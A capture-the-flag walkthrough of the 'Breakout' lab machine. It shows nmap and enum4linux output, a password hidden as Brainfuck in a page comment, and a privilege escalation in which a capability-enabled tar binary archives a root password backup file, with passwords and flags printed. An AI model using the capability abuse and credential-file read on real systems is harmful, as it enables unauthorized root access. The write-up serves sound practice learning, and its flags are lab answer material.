[*] BREAKOUT [*]

# Date : 08/01/2022

# ->Enumeration Phase:

# Nmap 7.91 scan initiated Sat Jan  8 20:26:36 2022 as: nmap -A -vv -p- -oN nmap 192.168.0.108
Nmap scan report for 192.168.0.108
Host is up, received arp-response (0.00064s latency).
Scanned at 2022-01-08 20:26:37 IST for 47s
Not shown: 65530 closed ports
Reason: 65530 resets
PORT      STATE SERVICE     REASON         VERSION
80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.4.51 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
10000/tcp open  http        syn-ack ttl 64 MiniServ 1.981 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: D8321F5C6AF5BC4D9D1614D96FF8826F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        syn-ack ttl 64 MiniServ 1.830 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: B83199F46BB051153DB8FE0F7598ED3D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 200 &mdash; Document follows
MAC Address: 08:00:27:37:68:30 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/8%OT=80%CT=1%CU=36070%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
OS:=61D9A654%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%
OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=
OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Uptime guess: 18.726 days (since Tue Dec 21 03:01:15 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: 5s
| nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BREAKOUT<00>         Flags: <unique><active>
|   BREAKOUT<03>         Flags: <unique><active>
|   BREAKOUT<20>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42056/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 53211/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 57119/udp): CLEAN (Failed to receive data)
|   Check 4 (port 28253/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-08T14:57:00
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.64 ms 192.168.0.108

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  8 20:27:24 2022 -- 1 IP address (1 host up) scanned in 48.94 seconds

# ->Exploitation Phase:

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan  8 20:34:09 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.0.108
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 192.168.0.108    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 192.168.0.108    |
 ============================================= 
Looking up status of 192.168.0.108
	BREAKOUT        <00> -         B <ACTIVE>  Workstation Service
	BREAKOUT        <03> -         B <ACTIVE>  Messenger Service
	BREAKOUT        <20> -         B <ACTIVE>  File Server Service
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 192.168.0.108    |
 ====================================== 
[+] Server 192.168.0.108 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 192.168.0.108    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 192.168.0.108    |
 ======================================= 
[+] Got OS info for 192.168.0.108 from smbclient: 
[+] Got OS info for 192.168.0.108 from srvinfo:
	BREAKOUT       Wk Sv PrQ Unx NT SNT Samba 4.13.5-Debian
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on 192.168.0.108    |
 ============================== 


 ========================================== 
|    Share Enumeration on 192.168.0.108    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.13.5-Debian)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.0.108
//192.168.0.108/print$	Mapping: DENIED, Listing: N/A
//192.168.0.108/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 192.168.0.108    |
 ===================================================== 


[+] Attaching to 192.168.0.108 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] BREAKOUT
	[+] Builtin

[+] Password Info for Domain: BREAKOUT

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =============================== 
|    Groups on 192.168.0.108    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 192.168.0.108 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1683874020-4104641535-3793993001
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-1683874020-4104641535-3793993001 and logon username '', password ''
S-1-5-21-1683874020-4104641535-3793993001-500 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-501 BREAKOUT\nobody (Local User)
S-1-5-21-1683874020-4104641535-3793993001-502 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-503 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-504 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-505 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-506 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-507 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-508 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-509 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-510 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-511 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-512 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-513 BREAKOUT\None (Domain Group)
S-1-5-21-1683874020-4104641535-3793993001-514 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-515 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-516 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-517 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-518 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-519 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-520 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-521 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-522 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-523 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-524 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-525 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-526 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-527 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-528 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-529 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-530 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-531 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-532 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-533 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-534 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-535 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-536 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-537 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-538 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-539 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-540 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-541 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-542 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-543 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-544 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-545 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-546 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-547 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-548 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-549 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-550 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1000 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1001 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1002 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1003 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1004 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1005 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1006 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1007 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1008 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1009 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1010 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1011 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1012 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1013 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1014 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1015 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1016 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1017 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1018 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1019 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1020 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1021 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1022 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1023 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1024 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1025 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1026 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1027 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1028 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1029 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1030 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1031 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1032 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1033 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1034 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1035 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1036 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1037 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1038 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1039 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1040 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1041 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1042 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1043 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1044 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1045 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1046 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1047 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1048 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1049 *unknown*\*unknown* (8)
S-1-5-21-1683874020-4104641535-3793993001-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\cyber (Local User)

 ============================================== 
|    Getting printer info for 192.168.0.108    |
 ============================================== 
No printers returned.


enum4linux complete on Sat Jan  8 20:34:39 2022

# Using Enum4linux Found a Username : cyber

>> In The Page source of default webpage apache found a brainfuck text.after decoding it found a
>> password

<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
-->
# password : .2uqPEfj3D<P'a-3

# user.txt : 3mp!r3{You_Manage_To_Break_To_My_Secure_Access}

# ->Privilage Escalation:

>> first find binaries having set capabilities for some process as a root.
# getcap -r / 2>/dev/null

>> find a capability : /home/cyber/tar cap_dac_read_search=ep
>> tar binary read any file on system make a tar file.
>> the i make a backup file and read a .old_pass.bak file in which a root password is held.

# ./tar -cvf backup /var/backups/.old_pass.bak
>> following output is return when cat the backup file

var/backups/.old_pass.bak0000600000000000000000000000002114134001114014303 0ustar  rootrootTs&4&YurgtRX(=~h

>> got a root access.
# root.txt : 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}

